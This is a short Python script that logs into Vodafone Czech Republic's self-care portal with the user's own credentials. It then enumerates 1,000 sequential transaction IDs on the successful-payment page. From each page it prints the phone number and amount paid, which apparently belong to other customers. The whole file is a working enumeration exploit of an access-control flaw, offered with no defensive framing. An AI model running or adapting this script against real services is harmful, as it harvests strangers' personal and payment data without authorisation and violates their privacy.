#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re

import mechanize
from pyquery import PyQuery as pq

START = 1530680
PAGES = 1e3

login, passwd = None, None

while not login:
    login = raw_input('Login? ')
while not passwd:
    passwd = raw_input('Heslo? ')

br = mechanize.Browser()
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-agent', 'Opera/9.80 (X11; Linux i686; U; en) Presto/2.7.62 Version/11.00')]

br.open('https://samoobsluha.vodafone.cz/online_platba_uspesna/?transactionId=0001530683')
br.select_form(nr=1)
br.form['msisdn'] = login
br.form['password'] = passwd
br.submit()

RE_NR = re.compile(r'([0-9]{9})')
RE_AMOUNT = re.compile(r'([0-9]+)\sK')

for i in xrange(START, START + int(PAGES)):
    br.open('https://samoobsluha.vodafone.cz/online_platba_uspesna/?transactionId=%s' % str(i).rjust(10, '0'))
    doc = pq(br.response().read())
    msg = doc.find('div.msgtext')
    if not msg:
        continue
    msg = pq(msg).text()
    amount = re.search(RE_AMOUNT, msg).group(1)
    nr = re.search(RE_NR, msg).group(1)
    print '%s\t%s' % (nr, amount)